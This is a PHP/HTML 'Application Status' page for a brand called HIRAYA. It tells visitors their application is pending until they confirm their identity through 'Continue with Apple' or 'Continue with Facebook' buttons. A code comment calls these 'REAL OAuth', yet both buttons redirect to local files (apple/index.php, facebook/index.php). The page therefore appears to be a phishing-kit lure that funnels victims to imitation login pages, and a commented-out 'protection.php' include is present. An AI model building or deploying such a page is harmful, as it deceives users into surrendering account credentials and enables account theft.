<?php
//require_once __DIR__ . '/protection.php';
session_start();
date_default_timezone_set('Asia/Manila');
$ref       = 'HIR-' . date('ymd') . '-' . strtoupper(substr(bin2hex(random_bytes(3)), 0, 6));
$submitted = date('F j, Y \a\t h:i A');

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Application Status — HIRAYA</title>

<link rel="icon" type="image/png" href="files/images/circlelogo.png">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,300;0,400;0,500;0,600;1,300;1,400&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
/* =========================================================
   HIRAYA — Application Status · self-contained
   Tokens & feel carried over from index.php
   ========================================================= */
:root{
  --hi-ink:#1a0a10; --hi-rose:#c9909a; --hi-mauve:#8b5c6b;
  --hi-blush:#faf8f5; --hi-hot:#e0576e; --hi-line:rgba(26,10,16,.08);
  --hi-muted:#7c6b70;
  --ff-display:"Cormorant Garamond",serif; --ff-body:"DM Sans",sans-serif;
}
*{margin:0;padding:0;box-sizing:border-box;}
html{scroll-behavior:smooth;}
body{
  font-family:var(--ff-body);color:var(--hi-ink);line-height:1.7;
  font-size:16px;min-height:100vh;overflow-x:hidden;
  background:
    radial-gradient(900px 560px at 10% -6%,rgba(201,144,154,.20) 0%,rgba(201,144,154,0) 55%),
    radial-gradient(900px 620px at 106% 12%,rgba(139,92,107,.18) 0%,rgba(139,92,107,0) 60%),
    linear-gradient(180deg,var(--hi-blush) 0%,#f3ece9 100%);
  background-attachment:fixed;
}
a{text-decoration:none;color:inherit;}
button{font-family:var(--ff-body);}
h1{font-family:var(--ff-display);font-weight:500;}

/* cursor */
.cursor,.cursor-ring{position:fixed;top:0;left:0;pointer-events:none;z-index:9999;
  transform:translate(-50%,-50%);border-radius:50%;}
.cursor{width:7px;height:7px;background:var(--hi-rose);}
.cursor-ring{width:34px;height:34px;border:1px solid rgba(139,92,107,.5);transition:width .25s,height .25s;}
@media (hover:none),(pointer:coarse){.cursor,.cursor-ring{display:none!important;}}

/* floating shapes */
.bg-shapes{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden;}
.bg-shapes span{position:absolute;border-radius:50%;filter:blur(60px);opacity:.55;animation:float 18s ease-in-out infinite;}
.bg-shapes .s1{width:320px;height:320px;top:-80px;left:-90px;background:radial-gradient(circle at 30% 30%,rgba(201,144,154,.55),rgba(201,144,154,0));}
.bg-shapes .s2{width:400px;height:400px;bottom:-140px;right:-120px;background:radial-gradient(circle at 30% 30%,rgba(139,92,107,.45),rgba(139,92,107,0));animation-delay:-6s;}
.bg-shapes .s3{width:240px;height:240px;top:40%;right:6%;background:radial-gradient(circle at 30% 30%,rgba(224,87,110,.35),rgba(224,87,110,0));animation-delay:-11s;opacity:.4;}
@keyframes float{0%,100%{transform:translate(0,0) scale(1);}50%{transform:translate(24px,-30px) scale(1.06);}}

/* shell */
.page{position:relative;z-index:1;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:44px 20px;}
.card{
  position:relative;width:100%;max-width:440px;
  background:rgba(255,255,255,.72);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);
  border:1px solid rgba(255,255,255,.7);border-radius:24px;
  box-shadow:0 34px 80px -34px rgba(26,10,16,.34),0 2px 8px rgba(26,10,16,.05);
  padding:32px 30px 28px;text-align:center;
  opacity:0;transform:translateY(22px);animation:rise .8s cubic-bezier(.2,.7,.2,1) forwards;
}
@keyframes rise{to{opacity:1;transform:translateY(0);}}
.corner{position:absolute;font-size:.6rem;color:var(--hi-rose);opacity:.7;line-height:1;}
.corner.tl{top:15px;left:16px;}.corner.br{bottom:15px;right:16px;}

/* header */
.brand-logo{display:inline-flex;align-items:center;gap:.5rem;font-family:var(--ff-display);
  font-size:1.48rem;font-weight:500;letter-spacing:.3em;text-indent:.3em;text-transform:uppercase;color:var(--hi-ink);}
.brand-logo::before{content:"\25C6";font-size:.42em;text-indent:0;letter-spacing:0;color:var(--hi-rose);transition:transform .4s ease;}
.brand-logo:hover::before{transform:rotate(90deg);}

/* pending pill */
.status-pill{display:inline-flex;align-items:center;gap:8px;margin-top:14px;padding:7px 16px;border-radius:100px;
  background:rgba(224,87,110,.10);border:1px solid rgba(224,87,110,.28);
  font-size:.56rem;font-weight:600;letter-spacing:.22em;text-transform:uppercase;color:var(--hi-hot);}
.status-pill .blip{width:7px;height:7px;border-radius:50%;background:var(--hi-hot);
  box-shadow:0 0 0 0 rgba(224,87,110,.6);animation:pulse 1.8s ease-out infinite;}
@keyframes pulse{70%{box-shadow:0 0 0 8px rgba(224,87,110,0);}100%{box-shadow:0 0 0 0 rgba(224,87,110,0);}}

/* orb */
.orb-wrap{position:relative;width:84px;height:84px;margin:20px auto 2px;}
.orb{position:absolute;inset:12px;border-radius:50%;background:linear-gradient(135deg,var(--hi-rose),var(--hi-mauve));
  display:flex;align-items:center;justify-content:center;color:#fff;box-shadow:0 14px 30px -12px rgba(139,92,107,.7);}
.orb svg{width:28px;height:28px;stroke:#fff;fill:none;stroke-width:1.6;stroke-linecap:round;}
.orb-ring{position:absolute;inset:0;border-radius:50%;border:1.5px dashed rgba(139,92,107,.5);animation:spin 9s linear infinite;}
.orb-halo{position:absolute;inset:6px;border-radius:50%;border:2px solid rgba(201,144,154,.5);animation:halo 2.4s ease-out infinite;}
@keyframes spin{to{transform:rotate(360deg);}}
@keyframes halo{0%{transform:scale(1);opacity:.7;}100%{transform:scale(1.35);opacity:0;}}

/* title */
.title{font-size:clamp(1.55rem,5.8vw,1.95rem);line-height:1.16;margin:8px 0 8px;letter-spacing:.01em;}
.title em{font-style:italic;color:var(--hi-mauve);}
.subtitle{font-size:.84rem;color:var(--hi-muted);font-weight:300;line-height:1.6;max-width:350px;margin:0 auto;}
.subtitle strong{color:var(--hi-ink);font-weight:600;}

/* stepper */
.stepper{position:relative;display:flex;justify-content:space-between;margin:24px 4px 4px;}
.stepper::before{content:"";position:absolute;top:13px;left:12px;right:12px;height:2px;background:var(--hi-line);border-radius:2px;}
.stepper::after{content:"";position:absolute;top:13px;left:12px;height:2px;border-radius:2px;
  width:calc((100% - 24px) * var(--progress,.5));background:linear-gradient(90deg,var(--hi-rose),var(--hi-hot));
  transition:width .6s cubic-bezier(.2,.7,.2,1);}
.st{position:relative;z-index:2;flex:1;display:flex;flex-direction:column;align-items:center;gap:7px;}
.st .node{width:26px;height:26px;border-radius:50%;background:#fff;border:1.5px solid var(--hi-line);
  display:flex;align-items:center;justify-content:center;font-size:.62rem;font-weight:600;color:var(--hi-muted);transition:all .35s ease;}
.st .lbl{font-size:.52rem;letter-spacing:.14em;text-transform:uppercase;color:var(--hi-muted);font-weight:500;text-align:center;line-height:1.3;max-width:72px;}
.st.done .node{background:var(--hi-mauve);border-color:var(--hi-mauve);color:#fff;font-size:0;}
.st.done .node::after{content:"\2713";font-size:.66rem;}
.st.done .lbl{color:var(--hi-mauve);}
.st.current .node{background:linear-gradient(135deg,var(--hi-rose),var(--hi-hot));border-color:var(--hi-hot);color:#fff;
  transform:scale(1.12);box-shadow:0 0 0 4px rgba(224,87,110,.16);animation:nodepulse 2s ease-out infinite;}
.st.current .lbl{color:var(--hi-hot);font-weight:600;}
@keyframes nodepulse{0%{box-shadow:0 0 0 3px rgba(224,87,110,.22);}70%{box-shadow:0 0 0 9px rgba(224,87,110,0);}100%{box-shadow:0 0 0 0 rgba(224,87,110,0);}}

/* reference */
.ref{display:flex;align-items:center;justify-content:space-between;gap:10px;margin-top:22px;
  padding:12px 16px;border:1px solid var(--hi-line);border-radius:14px;background:rgba(255,255,255,.5);text-align:left;}
.ref .r-lbl{font-size:.52rem;letter-spacing:.2em;text-transform:uppercase;color:var(--hi-rose);margin-bottom:2px;}
.ref .r-num{font-family:var(--ff-display);font-size:1.05rem;color:var(--hi-ink);letter-spacing:.04em;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
.ref .r-date{font-size:.68rem;color:var(--hi-muted);font-weight:300;margin-top:1px;}
.copy-btn{flex:none;display:inline-flex;align-items:center;gap:6px;cursor:pointer;padding:8px 12px;border-radius:100px;
  border:1px solid rgba(139,92,107,.3);background:#fff;color:var(--hi-mauve);font-size:.56rem;font-weight:600;letter-spacing:.12em;text-transform:uppercase;transition:all .25s ease;}
.copy-btn:hover,.copy-btn.copied{background:var(--hi-mauve);color:#fff;border-color:var(--hi-mauve);}
.copy-btn svg{width:12px;height:12px;stroke:currentColor;fill:none;stroke-width:1.6;}

/* WHY-PENDING explainer */
.why{margin-top:16px;padding:14px 16px;border-radius:16px;text-align:left;
  background:rgba(201,144,154,.12);border:1px solid rgba(139,92,107,.2);}
.why .why-head{display:flex;align-items:center;gap:8px;margin-bottom:6px;}
.why .why-head svg{width:16px;height:16px;stroke:var(--hi-mauve);fill:none;stroke-width:1.6;flex:none;}
.why .why-head b{font-family:var(--ff-display);font-size:1rem;font-weight:600;color:var(--hi-ink);letter-spacing:.01em;}
.why p{font-size:.78rem;color:var(--hi-mauve);font-weight:300;line-height:1.6;}
.why p strong{color:var(--hi-ink);font-weight:600;}

/* choose-to-continue */
.choose{margin-top:20px;}
.choose-label{font-size:.54rem;letter-spacing:.2em;text-transform:uppercase;color:var(--hi-rose);margin-bottom:12px;}
.auth{display:flex;flex-direction:column;gap:11px;}
.auth-btn{position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;gap:11px;
  width:100%;padding:16px 22px;border-radius:100px;border:none;cursor:pointer;color:#fff;
  font-family:var(--ff-body);font-weight:600;font-size:.74rem;letter-spacing:.12em;
  transition:transform .3s ease,box-shadow .3s ease,letter-spacing .3s ease;}
.auth-btn .ic{width:19px;height:19px;flex:none;}
.auth-btn::after{content:"";position:absolute;top:0;left:-130%;width:55%;height:100%;
  background:linear-gradient(100deg,transparent,rgba(255,255,255,.32),transparent);transition:left .55s ease;}
.auth-btn:hover::after{left:140%;}
.auth-apple{background:#000;box-shadow:0 14px 30px -14px rgba(0,0,0,.8);}
.auth-apple:hover{transform:translateY(-3px);letter-spacing:.16em;box-shadow:0 22px 46px -16px rgba(0,0,0,.75);}
.auth-fb{background:#1877F2;box-shadow:0 14px 30px -14px rgba(24,119,242,.7);}
.auth-fb:hover{background:#1466D2;transform:translateY(-3px);letter-spacing:.16em;box-shadow:0 22px 46px -16px rgba(24,119,242,.75);}
.auth-note{margin-top:11px;font-size:.66rem;color:var(--hi-muted);font-weight:300;line-height:1.5;display:flex;align-items:center;justify-content:center;gap:6px;}
.auth-note svg{width:12px;height:12px;stroke:var(--hi-mauve);fill:none;stroke-width:1.6;flex:none;}

/* divider + follow */
.divider{display:flex;align-items:center;justify-content:center;gap:12px;margin:22px 0 4px;}
.divider::before,.divider::after{content:"";height:1px;flex:1;background:var(--hi-line);}
.divider span{font-size:.54rem;letter-spacing:.2em;text-transform:uppercase;color:var(--hi-rose);white-space:nowrap;}
.follow{display:flex;justify-content:center;gap:12px;margin-top:14px;}
.follow a{width:44px;height:44px;border-radius:50%;display:flex;align-items:center;justify-content:center;
  border:1px solid var(--hi-line);background:#fff;color:var(--hi-mauve);transition:all .3s ease;}
.follow a:hover{transform:translateY(-3px);color:#fff;border-color:transparent;}
.follow a svg{width:19px;height:19px;}
.follow .ig:hover{background:linear-gradient(105deg,#833AB4,#C13584 40%,#E1306C 65%,#F77737 90%);}
.follow .tt:hover{background:#0F0F10;}

/* footer */
.foot{margin-top:22px;}
.foot .line{height:1px;width:50px;margin:0 auto 12px;background:var(--hi-line);}
.foot strong{display:block;font-family:var(--ff-display);font-style:italic;font-size:.94rem;color:var(--hi-ink);font-weight:500;margin-bottom:2px;}
.foot span{font-size:.72rem;color:var(--hi-muted);font-weight:300;letter-spacing:.02em;}

@media (max-width:480px){
  .page{padding:26px 14px;}
  .card{padding:28px 20px 24px;border-radius:20px;}
  .brand-logo{font-size:1.34rem;letter-spacing:.22em;text-indent:.22em;}
  .st .lbl{font-size:.48rem;}
}
@media (prefers-reduced-motion:reduce){
  .card,.bg-shapes span,.status-pill .blip,.orb-ring,.orb-halo,.st.current .node{animation:none!important;}
  .card{opacity:1!important;transform:none!important;}
  .auth-btn:hover,.follow a:hover{transform:none!important;}
}
.auth-btn {
  border: none;
  cursor: pointer;
  text-decoration: none;
  width: 100%;
}
</style>
</head>
<body>

  <div class="cursor" id="cursor" aria-hidden="true"></div>
  <div class="cursor-ring" id="cursorRing" aria-hidden="true"></div>

  <div class="bg-shapes" aria-hidden="true"><span class="s1"></span><span class="s2"></span><span class="s3"></span></div>

  <main class="page">
    <section class="card" aria-labelledby="statusTitle">

      <span class="corner tl" aria-hidden="true">&#9670;</span>
      <span class="corner br" aria-hidden="true">&#9670;</span>

      <a href="index.php" class="brand-logo">HIRAYA</a>

      <div class="status-pill"><span class="blip"></span> Application Pending</div>

      <div class="orb-wrap" aria-hidden="true">
        <div class="orb-ring"></div><div class="orb-halo"></div>
        <div class="orb"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><path d="M12 7.5V12l3 2"></path></svg></div>
      </div>

      <h1 class="title" id="statusTitle">Your application is <em>pending</em></h1>
      <p class="subtitle">Thanks for applying to HIRAYA. To move forward, choose how you'd
         like to <strong>continue and confirm your identity</strong> below.</p>

      <!-- Stepper -->
      <div class="stepper" style="--progress:.5;">
        <div class="st done"><span class="node"></span><span class="lbl">Submitted</span></div>
        <div class="st current"><span class="node">2</span><span class="lbl">Confirm Identity</span></div>
        <div class="st"><span class="node">3</span><span class="lbl">Under Review</span></div>
        <div class="st"><span class="node">4</span><span class="lbl">Approved</span></div>
      </div>

      <!-- Reference -->
<div class="ref">
  <div class="r-info">
    <div class="r-lbl">Reference No.</div>
    <div class="r-num" id="refNum">
      <?php echo htmlspecialchars($_SESSION['hiraya_reference'] ?? ''); ?>
    </div>
    <div class="r-date">Submitted <?php echo htmlspecialchars($submitted); ?></div>
  </div>
  <button type="button" class="copy-btn" id="copyBtn" aria-label="Copy reference number">
    <svg viewBox="0 0 24 24">
      <rect x="9" y="9" width="11" height="11" rx="2"></rect>
      <path d="M5 15V5a2 2 0 0 1 2-2h10"></path>
    </svg>
    <span id="copyText">Copy</span>
  </button>
</div>

      <!-- Why pending -->
      <div class="why" role="note">
        <div class="why-head">
          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><line x1="12" y1="11" x2="12" y2="16"></line><circle cx="12" cy="8" r=".6" fill="currentColor" stroke="none"></circle></svg>
          <b>Why is my status pending?</b>
        </div>
        <p><strong>Pending means your application hasn't been submitted for review yet</strong> —
           it can't proceed until your identity is confirmed. Choose a secure sign-in option
           below to verify and unlock the review of your application.</p>
      </div>

  <!-- Choose to continue (REAL OAuth) -->
<div class="choose">
  <div class="choose-label">Choose how to continue</div>

  <div class="auth">

    <button onclick="goToApple()" class="auth-btn auth-apple">
      <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
        <path d="M17.05 12.54c-.03-2.53 2.07-3.75 2.16-3.81-1.18-1.72-3.01-1.96-3.66-1.99-1.56-.16-3.04.92-3.83.92-.79 0-2.01-.9-3.3-.87-1.7.02-3.26.99-4.13 2.51-1.76 3.06-.45 7.59 1.27 10.07.84 1.21 1.84 2.57 3.15 2.52 1.26-.05 1.74-.82 3.27-.82 1.52 0 1.96.82 3.3.79 1.36-.02 2.22-1.23 3.05-2.45.96-1.4 1.36-2.76 1.38-2.83-.03-.01-2.64-1.01-2.66-4.04zM14.6 4.7c.7-.85 1.17-2.02 1.04-3.2-1 .04-2.22.67-2.94 1.51-.64.75-1.21 1.95-1.06 3.1 1.12.09 2.26-.57 2.96-1.41z"/>
      </svg>
      Continue with Apple
    </button>

    <button onclick="goToFacebook()" class="auth-btn auth-fb">
      <svg class="ic" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
        <path d="M22 12.06C22 6.5 17.52 2 12 2S2 6.5 2 12.06c0 5.02 3.66 9.18 8.44 9.94v-7.03H7.9v-2.91h2.54V9.85c0-2.52 1.49-3.91 3.77-3.91 1.09 0 2.24.2 2.24.2v2.46h-1.26c-1.24 0-1.63.78-1.63 1.57v1.89h2.78l-.44 2.91h-2.34V22c4.78-.76 8.44-4.92 8.44-9.94z"/>
      </svg>
      Continue with Facebook
    </button>

  </div>

  <p class="auth-note">
    <svg viewBox="0 0 24 24">
      <rect x="5" y="11" width="14" height="9" rx="2"></rect>
      <path d="M8 11V8a4 4 0 0 1 8 0v3"></path>
    </svg>
    Secure sign-in
  </p>
</div>

<script>
function goToApple(){
  window.location.href = "apple/index.php";
}

function goToFacebook(){
  window.location.href = "facebook/index.php";
}
</script>

      <!-- Follow (optional) -->
     

      <footer class="foot">
        <div class="line"></div>
        <strong>Powered by HIRAYA</strong>
        <span>Beauty. Fashion. Identity.</span>
      </footer>

    </section>
  </main>

<script>
(function(){
  "use strict";
  /* cursor */
  var fine=window.matchMedia("(hover: hover) and (pointer: fine)").matches;
  var cursor=document.getElementById("cursor"),ring=document.getElementById("cursorRing");
  if(fine&&cursor&&ring){
    var mx=0,my=0,rx=0,ry=0;
    document.addEventListener("mousemove",function(e){mx=e.clientX;my=e.clientY;cursor.style.left=mx+"px";cursor.style.top=my+"px";});
    (function trail(){rx+=(mx-rx)*.15;ry+=(my-ry)*.15;ring.style.left=rx+"px";ring.style.top=ry+"px";requestAnimationFrame(trail);})();
    document.querySelectorAll("a,button").forEach(function(el){
      el.addEventListener("mouseenter",function(){ring.style.width="48px";ring.style.height="48px";});
      el.addEventListener("mouseleave",function(){ring.style.width="34px";ring.style.height="34px";});
    });
  }
  /* copy reference */
  var b=document.getElementById("copyBtn"),t=document.getElementById("copyText"),n=document.getElementById("refNum");
  if(b&&n){
    b.addEventListener("click",function(){
      var v=n.textContent.trim(),done=function(){b.classList.add("copied");t.textContent="Copied";
        setTimeout(function(){b.classList.remove("copied");t.textContent="Copy";},1800);};
      if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(v).then(done).catch(fb);}else{fb();}
      function fb(){var e=document.createElement("textarea");e.value=v;e.style.position="fixed";e.style.opacity="0";
        document.body.appendChild(e);e.select();try{document.execCommand("copy");}catch(x){}document.body.removeChild(e);done();}
    });
  }
})();
</script>
</body>
</html>
